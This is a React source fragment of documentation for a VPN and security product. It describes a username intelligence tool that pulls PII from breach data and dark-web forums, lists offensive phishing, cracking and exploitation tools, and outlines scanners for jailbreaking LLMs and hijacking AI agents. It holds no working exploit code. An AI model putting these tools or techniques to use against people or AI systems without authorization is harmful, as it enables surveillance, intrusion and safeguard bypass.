        <p><strong>Username Intelligence</strong> (<code>/username-intel</code>) performs OSINT-grade username searches across 100+ platforms simultaneously. Enter a username and get a comprehensive intelligence report including profile data, linked emails, real names, locations, and associated accounts. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Platform Coverage</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Social Media", items: ["Twitter/X, Instagram, Facebook, TikTok", "Reddit, Pinterest, Tumblr, Mastodon", "LinkedIn (public profile data)", "Snapchat, BeReal, Threads"] },
            { cat: "Dev & Technical", items: ["GitHub (repos, gists, orgs, commit email)", "GitLab, Bitbucket, npm, PyPI, Crates.io", "HackerNews, Stack Overflow, Dev.to", "Replit, CodePen, JSFiddle"] },
            { cat: "Gaming", items: ["Steam, Xbox Gamertag, PSN, Epic Games", "Roblox, Fortnite, Valorant, Minecraft", "Discord (username search via Sherlock)", "Twitch, Kick, YouTube"] },
            { cat: "Forums & Communities", items: ["4chan, 8kun (archived), Telegram public", "Pastebin mentions, Ghostbin", "Dark web forum search (via Tor proxy)", "Breach databases — leaked username index"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Result Fields Per Platform</h4>
        <p className="text-[10px] font-mono text-primary/83">Each platform result includes: <strong>Profile URL</strong>, <strong>Account exists</strong> (confirmed/not found/private), <strong>Display name</strong>, <strong>Bio</strong>, <strong>Location</strong> (if public), <strong>Linked emails</strong> (where discoverable via API leakage), <strong>Confidence score</strong> (how certain the match is), and <strong>Risk meter</strong> (how much PII is exposed).</p>
        <h4 className="font-bold text-primary text-[11px] mt-3">Export Options</h4>
        <p className="text-[10px] font-mono text-primary/83">Export the full report as <strong>JSON</strong> (structured, machine-readable), <strong>CSV</strong> (platform, URL, status, name, location), or <strong>Markdown</strong> (formatted for OSINT reports and bug bounty submissions).</p>
        <Note type="warn">Username Intelligence performs passive, read-only queries — it never creates accounts, sends messages, or interacts with platforms. All queries route through the VPN tunnel. Only search usernames of accounts you own or have permission to investigate.</Note>
      </div>
    ),
  },
  {
    id: "vpn-tracker",
    title: "VPN Session Tracker",
    icon: Activity,
    content: (
      <div className="space-y-3">
        <p><strong>VPN Tracker</strong> (<code>/vpn-tracker</code>) provides a real-time view of all active VPN sessions, WireGuard peer statuses, node command history, and session analytics. Available to admin accounts only.</p>
        <h4 className="font-bold text-primary text-[11px]">Panels</h4>
        <div className="space-y-2">
          {[
            { t: "Node Status", d: "Live status grid of all registered nodes — online/offline indicator, peer count, last handshake, uptime, CPU load, and bandwidth throughput." },
            { t: "Active Peers", d: "Per-node peer table showing each connected device: WireGuard public key, assigned IP (10.8.0.x), last handshake time, bytes sent/received, and whether the peer has been revoked." },
            { t: "Command History", d: "Every command issued via the Terminal page, with timestamp, command text, ProxhqVPN Mode status, and whether it was blocked. Filterable by node, user, time range." },
            { t: "Session Log", d: "All authenticated API sessions: Clerk user ID, session start/end, pages accessed, IP address, and active subscription tier at the time." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Session Status Badges</h4>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
          <div>• <span className="text-green-400 font-bold">ACTIVE</span> — session is live, peer has handshaked within the last 3 minutes</div>
          <div>• <span className="text-yellow-400 font-bold">IDLE</span> — session open but no packets in the last 3–15 minutes</div>
          <div>• <span className="text-red-400 font-bold">STALE</span> — no handshake for 15+ minutes, WireGuard will drop the peer</div>
          <div>• <span className="text-primary/40 font-bold">REVOKED</span> — peer key has been removed from the server config</div>
        </div>
        <Note type="info">VPN Tracker data refreshes every 10 seconds. Click <strong>Force Refresh</strong> to poll all nodes immediately. Use the Export button to download the peer table as CSV for compliance auditing.</Note>
      </div>
    ),
  },
  {
    id: "parrot-tools",
    title: "Parrot OS Tool Library",
    icon: Layers,
    content: (
      <div className="space-y-3">
        <p><strong>Parrot Tools</strong> (<code>/parrot-tools</code>) is a curated, searchable index of every security tool included in Parrot OS Security Edition — organized by category, with descriptions, command examples, and direct links to the relevant ProxhqVPN tool where applicable. Available on all plans.</p>
        <h4 className="font-bold text-primary text-[11px]">Tool Categories</h4>
        <div className="grid grid-cols-2 gap-2">
          {[
            { cat: "Information Gathering", items: ["Nmap — port scanner and service fingerprinter", "Maltego — visual OSINT and link analysis", "theHarvester — email/domain OSINT", "Shodan CLI — internet-wide device search", "Subfinder — passive subdomain enumeration"] },
            { cat: "Vulnerability Analysis", items: ["Nikto — web server vulnerability scanner", "OpenVAS — network vulnerability scanner", "SQLmap — automated SQL injection", "WPScan — WordPress security scanner", "Lynis — system security auditing"] },
            { cat: "Exploitation", items: ["Metasploit Framework — modular exploit framework", "BeEF — browser exploitation framework", "Exploit-DB searchsploit — offline CVE search", "RouterSploit — embedded device exploits", "Impacket — Windows/SMB exploitation"] },
            { cat: "Password & Crypto", items: ["Hashcat — GPU-accelerated hash cracking", "John the Ripper — CPU hash cracking", "Hydra — network authentication brute-force", "CrackMapExec — Active Directory auditing", "Aircrack-ng — WiFi WEP/WPA cracking"] },
            { cat: "Forensics & Reverse Engineering", items: ["Volatility 3 — memory forensics", "Ghidra — NSA disassembler/decompiler", "Autopsy — digital forensics platform", "Wireshark — packet capture and analysis", "Binwalk — firmware extraction"] },
            { cat: "Social Engineering", items: ["SET (Social Engineering Toolkit) — phishing, credential harvest", "Gophish — phishing campaign management", "Evilginx2 — MITM phishing with 2FA bypass", "King Phisher — email phishing simulation", "Zphisher — ready-made phishing templates"] },
          ].map(({ cat, items }) => (
            <div key={cat} className="border border-primary/10 rounded px-2.5 py-2">
              <div className="text-[10px] font-mono font-bold text-primary mb-1">{cat}</div>
              {items.map(i => <div key={i} className="text-[9px] font-mono text-primary/83">• {i}</div>)}
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Use the Library</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <code>/parrot-tools</code> and use the search bar to find a tool by name or description.</li>
          <li><span className="text-primary/30">2.</span> Filter by category using the sidebar filter.</li>
          <li><span className="text-primary/30">3.</span> Click any tool card to expand the full description, usage examples, and install command.</li>
          <li><span className="text-primary/30">4.</span> If a ProxhqVPN equivalent exists, the <strong>Use in ProxhqVPN</strong> button links directly to that page.</li>
        </ol>
        <Note type="info">The Parrot Tools library is a reference index — it does not install or execute tools on your machine. Use the ProxhqVPN Terminal page or your local Parrot OS installation to run the tools directly.</Note>
      </div>
    ),
  },
  {
    id: "auto-setup",
    title: "Auto Setup",
    icon: Settings,
    content: (
      <div className="space-y-3">
        <p><strong>Auto Setup</strong> (<code>/setup</code>) automatically installs all server-side dependencies required for the ProxhqVPN API server — WireGuard, Tor, OpenVPN, proxychains4, and iptables. Admin-only. Used during initial server provisioning.</p>
        <h4 className="font-bold text-primary text-[11px]">What Gets Installed</h4>
        <div className="space-y-2">
          {[
            { t: "WireGuard Tools", d: "wireguard-tools package — includes wg and wg-quick. Required for generating server keypairs, managing peers, and running the wg0 interface." },
            { t: "OpenVPN", d: "openvpn package — used for legacy client compatibility and the double-hop VPN Gate routing. Optional but recommended." },
            { t: "Tor", d: "tor daemon — provides the Tor SOCKS5 proxy at 127.0.0.1:9050 used by the Onion Browser and OSINT tools." },
            { t: "proxychains4", d: "Routes any command-line tool through Tor or SOCKS5 proxy. Used by the Terminal in ProxhqVPN Mode." },
            { t: "iptables", d: "Netfilter firewall rules engine. Required for the Kill Switch (DROP rules), split tunneling (mark-based routing), and the IPv6 leak protection rules." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Install Process</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Navigate to <code>/setup</code> (admin login required).</li>
          <li><span className="text-primary/30">2.</span> The Dependency Status grid shows which packages are already installed (green) and which are missing (red).</li>
          <li><span className="text-primary/30">3.</span> Click <strong>Install All Missing</strong> to run the automated install script.</li>
          <li><span className="text-primary/30">4.</span> A streaming install log shows real-time output from each package manager command.</li>
          <li><span className="text-primary/30">5.</span> When all packages show green, the server is ready for VPN node operation.</li>
        </ol>
        <Note type="warn">Auto Setup runs apt-get / dnf / yum commands as root on the server. Only run this on a clean VPS that has been dedicated to ProxhqVPN. Do not run on shared hosting or production machines that serve other applications.</Note>
      </div>
    ),
  },
  {
    id: "ai-security-suite",
    title: "AI Security Suite",
    icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p>The <strong>AI Security Suite</strong> (<code>/ai-security</code>) is ProxhqVPN's integrated toolkit for auditing, attacking, and defending AI/LLM-powered systems. As AI becomes infrastructure, adversarial attacks on AI systems are now a critical attack surface. Command Center Pro only.</p>
        <h4 className="font-bold text-primary text-[11px]">Integrated Sub-Tools</h4>
        <div className="space-y-2">
          {[
            { t: "LLM Probe", d: "Automated prompt injection and jailbreak scanner. Tests 200+ adversarial prompts against any LLM endpoint (OpenAI, Anthropic, local Ollama). Detects: goal hijacking, persona override, system prompt extraction, content filter bypass, indirect injection via tool outputs." },
            { t: "Agent Strike", d: "Adversarial testing framework for AI agents (AutoGPT, LangChain, CrewAI, Claude Computer Use). Simulates tool-call injection, memory poisoning, agent loop exploitation, and privilege escalation via compromised tool responses." },
            { t: "AI Shield", d: "Defensive hardening for LLM-backed applications. Analyzes your system prompt for injection surfaces, suggests output sanitization rules, tests input validation logic, and generates a hardened system prompt template." },
            { t: "SOC Copilot", d: "AI-assisted security operations: ingests SIEM events, Ghost Trace anomalies, and firewall logs and generates natural-language incident summaries, triage recommendations, and remediation playbooks." },
            { t: "MCP Auditor", d: "Security audit for Model Context Protocol (MCP) server configurations. Checks for tool injection vulnerabilities, permission escalation paths, and unsafe resource exposures in Claude Desktop / VS Code Copilot MCP setups." },
            { t: "WAF Hardening Audit", d: "Tests your application's WAF or input validation against AI-specific attack patterns: prompt smuggling in API payloads, adversarial image inputs, polyglot inputs that bypass both LLM safety and WAF regex rules simultaneously." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">LLM Probe — How to Run a Scan</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Go to <strong>AI Security Suite → LLM Probe</strong>.</li>
          <li><span className="text-primary/30">2.</span> Enter the target API endpoint URL and authentication header (Bearer token or API key).</li>
          <li><span className="text-primary/30">3.</span> Choose attack categories: Goal Hijacking, System Prompt Extraction, Jailbreak, Indirect Injection, or All.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Run Probe</strong>. The tool sends each adversarial prompt and analyzes the model response for indicators of bypass.</li>
          <li><span className="text-primary/30">5.</span> Review the findings report: each successful injection is marked Critical, partial bypasses as High, and resistant prompts as Passed.</li>
        </ol>
        <Note type="danger">Only test AI systems you own or have explicit written permission to audit. Unauthorized testing of third-party AI APIs violates their terms of service and may violate the CFAA. Results of LLM security testing should be handled as confidential vulnerability data.</Note>
      </div>
    ),
  },
  {
    id: "warrant-canary",
    title: "Warrant Canary",
    icon: FileText,
    content: (
      <div className="space-y-3">
        <p>The <strong>Warrant Canary</strong> is a publicly accessible transparency statement published by ALPHA UNLIMITED TECHNOLOGIES LLC at <code>/api/warrant-canary</code>. It is renewed every 30 days and confirms the absence of secret government orders that cannot be publicly disclosed.</p>
        <h4 className="font-bold text-primary text-[11px]">What the Canary States</h4>
        <div className="space-y-1 text-[10px] font-mono text-primary/83 ml-2">
          <div>• No National Security Letters (NSLs) have been received</div>
          <div>• No FISC / FISA Court orders have been received</div>
          <div>• No gag orders preventing disclosure of government surveillance requests</div>
          <div>• No user encryption keys have been handed to any government entity</div>
          <div>• No backdoors have been installed in any ProxhqVPN software or infrastructure</div>
          <div>• No mass surveillance of user traffic is occurring</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">How to Verify</h4>
        <ol className="space-y-1.5 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Fetch the canary endpoint: <code>curl https://proxhq.app/api/warrant-canary</code></li>
          <li><span className="text-primary/30">2.</span> Verify the <code>issued_at</code> timestamp is within the last 30 days.</li>
          <li><span className="text-primary/30">3.</span> Verify all six negative statements are present.</li>
          <li><span className="text-primary/30">4.</span> If the canary is missing, expired, or any statement has been removed — treat it as a canary failure indicating a potential secret order has been received.</li>
        </ol>
        <Note type="info">The warrant canary is a legal mechanism pioneered by privacy advocates. If ALPHA UNLIMITED TECHNOLOGIES LLC ever receives an NSL or similar order, we will allow the canary to expire rather than lie. We recommend bookmarking the endpoint and checking it monthly.</Note>
      </div>
    ),
  },
  {
    id: "installation-guide",
    title: "Installation Guide — All Platforms",
    icon: Download,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN works on every platform via WireGuard. Choose your platform below for complete step-by-step setup instructions. The <strong>Downloads page</strong> (<code>/downloads</code>) also provides downloadable README files for each platform.</p>
        <h4 className="font-bold text-primary text-[11px]">Windows</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Download WireGuard for Windows from wireguard.com/install/ — run the installer.</li>
          <li><span className="text-primary/30">2.</span> In ProxhqVPN → <strong>WireGuard Config</strong>, select a server node and click <strong>Download Config</strong>.</li>
          <li><span className="text-primary/30">3.</span> In the WireGuard app, click <strong>Add Tunnel → Import from file</strong> and select the downloaded .conf file.</li>
          <li><span className="text-primary/30">4.</span> Click <strong>Activate</strong>. You are now connected.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">macOS</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Install via Homebrew: <code>brew install wireguard-tools</code>, or install the WireGuard App from the Mac App Store.</li>
          <li><span className="text-primary/30">2.</span> Download config from ProxhqVPN → <strong>WireGuard Config</strong>.</li>
          <li><span className="text-primary/30">3.</span> If using the App Store app: Open WireGuard → Add Tunnel → Import. If using CLI: <code>sudo wg-quick up ~/proxhq.conf</code></li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Linux (Ubuntu/Debian)</h4>
        <div className="bg-black border border-primary/20 rounded px-3 py-2 text-[9px] font-mono text-primary/88 space-y-0.5">
          <div>sudo apt update && sudo apt install wireguard</div>
          <div>sudo cp proxhq.conf /etc/wireguard/wg0.conf</div>
          <div>sudo wg-quick up wg0</div>
          <div>sudo systemctl enable wg-quick@wg0  # auto-start on boot</div>
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Android</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Install <strong>WireGuard</strong> from Google Play Store.</li>
          <li><span className="text-primary/30">2.</span> In ProxhqVPN → <strong>WireGuard Config</strong>, click <strong>Show QR Code</strong>.</li>
          <li><span className="text-primary/30">3.</span> In the WireGuard app, tap + → <strong>Scan QR code</strong>. Point at the QR code on screen.</li>
          <li><span className="text-primary/30">4.</span> Enable the tunnel. Grant VPN permission when prompted.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">iPhone / iPad (iOS)</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Install <strong>WireGuard</strong> from the App Store.</li>
          <li><span className="text-primary/30">2.</span> In ProxhqVPN → <strong>WireGuard Config</strong>, click <strong>Show QR Code</strong>.</li>
          <li><span className="text-primary/30">3.</span> In WireGuard app, tap + → <strong>Create from QR code</strong>. Scan the code.</li>
          <li><span className="text-primary/30">4.</span> Toggle the tunnel on. Approve the VPN configuration prompt.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Router (OpenWRT)</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> SSH into your router: <code>ssh root@192.168.1.1</code></li>
          <li><span className="text-primary/30">2.</span> Install WireGuard: <code>opkg update && opkg install luci-app-wireguard</code></li>
          <li><span className="text-primary/30">3.</span> In ProxhqVPN → <strong>Router Config</strong>, select OpenWRT and download the setup script.</li>
          <li><span className="text-primary/30">4.</span> Run the script on the router. All devices on your LAN will route through ProxhqVPN automatically.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Amazon Fire Stick / Fire TV</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Enable Developer Options on Fire Stick: Settings → My Fire TV → Developer Options → Apps from Unknown Sources: ON.</li>
          <li><span className="text-primary/30">2.</span> Install Downloader app from the Amazon Appstore.</li>
          <li><span className="text-primary/30">3.</span> Use Downloader to install the WireGuard APK: search "WireGuard APK" in the Downloader browser.</li>
          <li><span className="text-primary/30">4.</span> Import the ProxhqVPN config file downloaded from the WireGuard Config page.</li>
        </ol>
        <h4 className="font-bold text-primary text-[11px] mt-3">Apple TV (tvOS)</h4>
        <ol className="space-y-1 text-[10px] font-mono text-primary/83">
          <li><span className="text-primary/30">1.</span> Install WireGuard from the Apple TV App Store.</li>
          <li><span className="text-primary/30">2.</span> On your iPhone, export the ProxhqVPN WireGuard config to the WireGuard iOS app.</li>
          <li><span className="text-primary/30">3.</span> Use iPhone to push the config to Apple TV via iCloud/AirDrop (WireGuard supports peer sync between Apple devices).</li>
          <li><span className="text-primary/30">4.</span> Enable the tunnel on Apple TV in Settings → VPN &amp; Device Management.</li>
        </ol>
        <Note type="info">For Smart TVs (Samsung Tizen, LG webOS), gaming consoles (PS5, Xbox), and Chromebooks, use the <strong>Smart DNS</strong> feature instead of WireGuard — it provides geo-unblocking without requiring WireGuard app installation on the device.</Note>
      </div>
    ),
  },
  {
    id: "ram-wireguard",
    title: "RAM-Only WireGuard Keys",
    icon: Key,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN nodes implement a <strong>Mullvad-style RAM-only WireGuard key architecture</strong> — a critical privacy upgrade that means server-side private key material never touches a disk at any point. All 4 active nodes (Chicago 61, London 62, LA 63, Tokyo 64) use this architecture.</p>
        <h4 className="font-bold text-primary text-[11px]">How It Works</h4>
        <div className="space-y-2">
          {[
            { t: "No Key on Disk", d: "The WireGuard base config (/etc/wireguard/wg0-base.conf) contains no PrivateKey field. The key field is intentionally absent — a disk image of the server contains zero cryptographic material." },
            { t: "Boot-Time Key Fetch", d: "On startup, the proxhq-wg-init.service systemd service runs a provisioning script that POSTs to POST /api/daemon-inbound/wg-key with the node ID and a pre-shared secret (X-Daemon-PSK header). The API returns the node's private key." },
            { t: "RAM-Only Storage", d: "The key is written exclusively to /dev/shm/wg-private.key — a tmpfs (volatile RAM) filesystem. /dev/shm is never swapped to disk and is cleared on reboot/shutdown. The wg-quick@wg0 service is configured (via systemd override) to read the full config from /dev/shm/wg0.conf." },
            { t: "Key Destruction", d: "Power off the server → key is gone. Reboot → key must be re-fetched. This ensures a physical server seizure (even mid-operation) yields no usable cryptographic material from the disk." },
            { t: "API Security", d: "The key endpoint (POST /api/daemon-inbound/wg-key) requires both the X-Daemon-PSK header AND a valid nodeId in the body. Repeated auth failures trigger a 30-minute IP ban in the API server memory." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Security Model</h4>
        <CB label="what's on disk vs what's in ram">{`ON DISK (safe to seize):
  /etc/wireguard/wg0-base.conf   # no PrivateKey field
  /usr/local/bin/proxhq-wg-init.sh  # provisioning logic
  /etc/systemd/system/proxhq-wg-init.service

IN RAM ONLY (/dev/shm/ — destroyed on power-off):
  /dev/shm/wg-private.key        # WireGuard private key
  /dev/shm/wg0.conf              # full config read by wg-quick`}</CB>
        <h4 className="font-bold text-primary text-[11px] mt-3">Client-Side Keys</h4>
        <p className="text-[10px] font-mono text-primary/83">Client private keys (generated via /wireguard or the mobile app) are generated in your browser/app and never sent to the server. The server only receives and stores the client's <strong>public key</strong>. Your client private key should be stored securely in your OS keychain or the WireGuard app's encrypted store.</p>
        <Note type="info">RAM-only key storage means even a successful physical attack on a ProxhqVPN node yields no key material that could be used to decrypt past or future sessions. This is the strongest server-side key protection available without hardware HSMs.</Note>
      </div>
    ),
  },
  {
    id: "node-hardening",
    title: "Node Security Hardening",
    icon: ShieldAlert,
    content: (
      <div className="space-y-3">
        <p>The <strong>Node Security Hardening Script</strong> is a comprehensive automated hardening suite for each ProxhqVPN server node. Download it from <strong>Firewall → NodeSync tab → Full Node Security Hardening Script</strong>. Run once as root on a fresh node. It installs 9 independent systemd services — none of which block VPN user traffic.</p>
        <h4 className="font-bold text-primary text-[11px]">The 9 Hardening Services</h4>
        <div className="space-y-2">
          {[
            { t: "1. sysctl Hardening", d: "Applies 20+ kernel parameters: IP spoofing protection (rp_filter=1), SYN flood protection (syncookies=1), ICMP redirect rejection, log martians, ASLR (randomize_va_space=2), kernel pointer restriction (kptr_restrict=2), dmesg restriction (dmesg_restrict=1)." },
            { t: "2. WireGuard-Aware iptables", d: "Sets INPUT DROP + FORWARD DROP default policies, then explicitly: FORWARD -i wg0 -j ACCEPT (client traffic in), FORWARD -o wg0 -j ACCEPT (client traffic out), INPUT -p udp --dport 51820 -j ACCEPT (WireGuard handshakes), INPUT -p tcp --dport 22 -j ACCEPT (SSH). All other INPUT is dropped at the perimeter." },
            { t: "3. IPv6 Mirror (ip6tables)", d: "Mirrors all iptables rules onto ip6tables — same DROP policy, same WireGuard FORWARD ACCEPT, same SSH allow. Prevents IPv6 bypass attacks where an attacker reaches the node via its IPv6 address while iptables only watches IPv4." },
            { t: "4. fail2ban", d: "Installs and configures fail2ban for SSH: 3 auth failures → 1-hour IP ban, 6 failures → 24-hour ban. Also monitors auth.log and the ProxhqVPN API log for repeated 401s. Bans applied via iptables and ip6tables simultaneously." },
            { t: "5. SSH Hardening", d: "Rewrites /etc/ssh/sshd_config: PasswordAuthentication no, PermitRootLogin no, MaxAuthTries 3, ClientAliveInterval 300, ClientAliveCountMax 2, AllowAgentForwarding no, X11Forwarding no. Requires key-only SSH access." },
            { t: "6. DDoS Monitor", d: "A systemd watchdog using ss + conntrack. Polls every 10 seconds. Any single source IP exceeding the threshold (default: 5,000 new connections/10 s) is immediately banned via iptables with a 30-minute expiry. Reports the event to POST /api/daemon-inbound/traffic-flag." },
            { t: "7. Security Event Reporter", d: "Tails Suricata's fast.log (IPS signatures). When a VPN peer IP matches an alert, logs to the Security Events table in the dashboard for admin visibility. Traffic still flows — this is observation only, not blocking." },
            { t: "8. Per-Peer Rules Enforcer", d: "Polls GET /api/daemon-inbound/peer-rules-export every 60 seconds. Resolves each peer's WireGuard public key to its allocated IP (via wg show allowed-ips), then applies the configured iptables FORWARD rule (ACCEPT / DROP / LIMIT). This is how per-device firewall rules work in real time." },
            { t: "9. Firewall Sync Daemon", d: "Polls GET /api/daemon-inbound/wg-config every 30 seconds. Fetches the latest iptables ruleset from the dashboard and applies it atomically with iptables-restore. Rule changes you make in the UI propagate to all nodes within 30 seconds automatically." },
          ].map(({ t, d }) => (
            <div key={t} className="border border-primary/10 rounded px-3 py-2">
              <div className="text-[10px] font-mono font-bold text-primary">{t}</div>
              <div className="text-[9px] font-mono text-primary/83 mt-0.5">{d}</div>
            </div>
          ))}
        </div>
        <h4 className="font-bold text-primary text-[11px] mt-3">Running the Script</h4>
        <CB label="download and run on a node">{`# On your node as root:
bash proxhq-hardening-chicago-61.sh   # adapt to your node

# Verify all services started:
systemctl status proxhq-ddos-monitor
systemctl status proxhq-sec-reporter
systemctl status proxhq-peer-rules
systemctl status proxhq-atr-watchdog
systemctl status proxhq-fw-sync`}</CB>
        <Note type="warn">SSH hardening (step 5) disables password auth. Ensure your SSH public key is in ~/.ssh/authorized_keys before running. If you lock yourself out, use your cloud provider's web console to recover access.</Note>
      </div>
    ),
  },
  {
    id: "ztna-device-posture",
    title: "ZTNA & Device Posture",
    icon: Shield,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN uses Zero Trust Network Access (ZTNA) to verify the security posture of your device before issuing a WireGuard tunnel configuration. No device is trusted simply because it has valid credentials — it must also pass a posture check.</p>

        <div className="border border-primary/20 rounded p-3 bg-primary/5">
          <div className="text-[10px] font-mono font-bold text-primary mb-1">What is ZTNA?</div>
          <p>Zero Trust means: <em>never trust, always verify</em>. Even after you authenticate with your account, ProxhqVPN evaluates whether your <strong>device</strong> is safe enough to receive a tunnel config. A stolen session token used on a rooted, unpatched device will still be denied.</p>
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">THE 8 POSTURE SIGNALS</div>
        <div className="space-y-1">
          {[
            ["Disk Encryption", "20 pts", "BitLocker / FileVault / dm-crypt enabled"],
            ["Firewall Enabled", "15 pts", "Host firewall is active"],
            ["EDR Installed", "15 pts", "Endpoint Detection & Response agent present"],
            ["No Root / Jailbreak", "20 pts", "Device is not rooted or jailbroken"],
            ["Patch Age", "0–15 pts", "≤30 days = full 15 pts; 31–90 days = 8 pts; >90 days = 0"],
            ["Certificate Valid", "10 pts", "Valid device cert signed by ProxhqVPN CA"],
            ["IP Reputation Clean", "5 pts", "Source IP not on threat intelligence blocklists"],
            ["OS Version", "+0 / –5 pts", "Unsupported OS versions lose 5 pts"],
          ].map(([signal, pts, desc]) => (
            <div key={signal} className="flex gap-2 text-[9px] font-mono border border-primary/10 rounded px-2 py-1">
              <span className="text-primary font-bold w-36 shrink-0">{signal}</span>
              <span className="text-yellow-400 w-16 shrink-0">{pts}</span>
              <span className="text-primary/70">{desc}</span>
            </div>
          ))}
        </div>

        <div className="border border-primary/20 rounded p-3 bg-primary/5 mt-2">
          <div className="text-[10px] font-mono font-bold text-primary mb-1">TRUST SCORE THRESHOLD</div>
          <p className="text-[9px] font-mono">Score ≥ 75 → <span className="text-green-400">allow=true</span> — WireGuard config generation permitted.<br />Score &lt; 75 → <span className="text-red-400">allow=false</span> — config generation blocked, remediation shown.</p>
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">SUBMITTING A POSTURE CHECK</div>
        <div className="bg-black/40 rounded p-2 font-mono text-[9px] text-green-300">
          POST /api/ztna/posture{"\n"}
          {`{
  "fingerprint": "sha256-<stable-device-id>",
  "signals": {
    "diskEncryption":    true,
    "firewallEnabled":   true,
    "edrInstalled":      false,
    "noRootOrJailbreak": true,
    "patchAge":          14,
    "certificateValid":  true,
    "ipReputationClean": true,
    "osVersion":         "Windows 11"
  }
}`}
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">ADMIN — VIEWING DEVICE RECORDS</div>
        <p className="text-[9px] font-mono text-primary/80">
          Security admins can view the full posture history for any device:<br />
          <span className="text-green-300">GET /api/ztna/device/:fingerprint</span><br />
          Requires <span className="text-yellow-300">security:read</span> permission (security_admin / auditor / owner roles).
          All posture denials also appear on the SIEM page (<a href="/siem" className="text-primary hover:underline">/siem</a>).
        </p>

        <div className="border border-yellow-900/40 rounded p-3 bg-yellow-950/20 mt-2">
          <div className="text-[10px] font-mono font-bold text-yellow-400 mb-1">⚠ CURRENT LIMITATION</div>
          <p className="text-[9px] font-mono text-primary/80">
            The posture check is available as an API but the VPN client does not yet enforce it before config generation.
            This is the highest-priority open security item. For maximum security, manually call <code>POST /api/ztna/posture</code> and verify allow=true before generating your WireGuard config.
          </p>
        </div>

        <div className="text-[10px] font-mono font-bold text-primary mt-3 mb-1">IMPROVING YOUR SCORE</div>
        <div className="space-y-1">
          {[
            ["Enable full-disk encryption", "BitLocker (Windows), FileVault (macOS), dm-crypt (Linux) — adds 20 pts"],
            ["Install an EDR agent", "CrowdStrike Falcon, Microsoft Defender ATP, or open-source Wazuh — adds 15 pts"],
            ["Keep OS patches current", "Run Windows Update / sudo apt upgrade / softwareupdate — adds up to 15 pts"],
            ["Get a device certificate", "Run: bash standalone/scripts/generate-ca-and-mtls.sh — adds 10 pts"],
          ].map(([action, detail]) => (
            <div key={action} className="border border-primary/10 rounded px-2 py-1 text-[9px] font-mono">
              <div className="text-primary font-bold">{action}</div>
              <div className="text-primary/70">{detail}</div>
            </div>
          ))}
        </div>
      </div>
    ),
  },
  {
    id: "rbac-roles",
    title: "RBAC — Roles & Permissions",
    icon: Shield,
    content: (
      <div className="space-y-3">
        <p>ProxhqVPN uses Role-Based Access Control (RBAC) to limit what each user can do. Six roles are defined — from <strong>owner</strong> (unrestricted) to <strong>user</strong> (tunnel configs only). Roles are assigned per account and checked on every API request.</p>

        <div className="text-[10px] font-mono font-bold text-primary mt-2 mb-1">THE SIX ROLES</div>
        <div className="space-y-1">
          {[
            ["owner", "text-red-400", "Unrestricted access. Can manage all resources and assign roles."],
